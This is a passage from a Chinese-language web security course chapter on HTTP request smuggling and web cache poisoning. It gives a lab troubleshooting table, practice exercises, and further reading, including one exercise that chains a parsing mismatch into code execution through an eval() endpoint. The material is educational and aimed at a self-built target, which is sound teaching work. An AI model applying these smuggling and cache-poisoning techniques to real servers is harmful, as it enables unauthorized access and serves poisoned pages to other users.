| 双 TE 探测两个顺序都是 200 | 前端策略不同结论不同：取第一个 TE 的前端会让探针一、二的结果对调；先确认靶的启动参数再读指纹（[[#5.3 双 TE 探测：给前端的解析策略留指纹\|5.3]]） |
| TE.CL 打完后端日志多出一条 400 | 块尾残余 `0\r\n\r\n` 被当成请求行解析了——这是字节错位的直接证据，不是故障（[[#3.3 TE.CL：前端信 TE，后端信 CL\|3.3]]） |
| 走私载荷里写 `GET /admin` 后端却回 404 | 体里的字节要构成一条一字不差的完整请求：请求行、`Host` 头、结尾空行缺一不可；从两侧日志的 repr 行逐字节核对 |
| 缓存靶投毒后受害者拿到干净页面 | 两处查键：查询串不同就是不同的键；TTL 已过毒档被淘汰。`cache.log` 的 MISS/HIT 行直接给出答案（[[#6.3 投毒全过程\|6.3]]） |
| 投毒请求自己收到的就是毒页，怀疑没生效 | 这恰恰是生效的证据：第一发 MISS 回源后 STORE，响应即毒档；再用不带头的请求确认 HIT 复现即可 |
| curl 打 9600 段全部超时 | 环境代理劫持了请求：`--noproxy '*'` 直连靶机；仍不通就用 `ss -ltn \| grep 96` 确认靶在 LISTEN |

## 9. 配套练习与延伸阅读

配套练习：

1. 把后端的 `/reflect` 改成"把请求体交给 `eval()`"的假想内网接口，走私一条让 `eval` 执行打印命令的请求，走通"解析分歧 → 内网接口 → 代码执行"的完整链路；再把后端换成取第一个 TE 的策略，观察哪几种构造失效、哪种照常。
2. 给前端实现 de-chunk 转发（把块状体解成定长体、补写新的 Content-Length、剥掉 TE 头），重放第 3 节的三种走私，对照 3.5 节折叠框的预言核对结果。
3. 把第 5 节的三个检测写成一个自动化脚本：起靶、按顺序发探针、输出指纹结论表；换前端策略参数重跑，验证指纹随策略变化。
4. 给缓存靶把 `X-Forwarded-Host` 加进缓存键，重打 6.3，观察投毒失效的原理性原因；再把键改成"路径 + Host"（真实 CDN 的常见形态），讨论还有什么 unkeyed 头能漏进来。
5. 给前端 ACL 增加"体长度超过 N 就拒绝"的规则，思考它能否拦住第 4 节的两种利用；再想想 5.2 的计时探针为什么对这类规则免疫。

延伸阅读：

- RFC 9112（<https://rfc-editor.org/rfc/rfc9112>）第 6 节 Message Body Length——CL/TE 并存、重复头、块语法的权威定义，1.1 与 1.2 节的规范出处；
- PortSwigger Web Security Academy 的 HTTP request smuggling 专题（<https://portswigger.net/web-security/request-smuggling>）——本章三种走私的免费互动实验，与自建靶互相印证；
- James Kettle《HTTP Desync Attacks: request smuggling reinvented》（2019，<https://portswigger.net/research/http-desync-attacks-request-smuggling-reinvented>）——检测方法论（本章第 5 节的技法谱系）与利用链的系统化原典；
- PortSwigger Web Security Academy 的 Web cache poisoning 专题（<https://portswigger.net/web-security/web-cache-poisoning>）——真实产品形态下的投毒实验；
- James Kettle《Web Cache Entanglement》（2020，<https://portswigger.net/research/web-cache-entanglement>）——缓存键完整性的系统分析方法，6.1 节 keyed/unkeyed 概念的展开；
- 三章联读：本章的投毒落点接 [[W08-XSS|W08]] 的存储型 XSS 与 [[W13-逻辑与认证漏洞|W13]] 的会话劫持；走私把"前端够不到的后端入口"变成"精确可达"，与 [[W10-SSRF|W10]] 的内网触达是同一命题的两种解法。
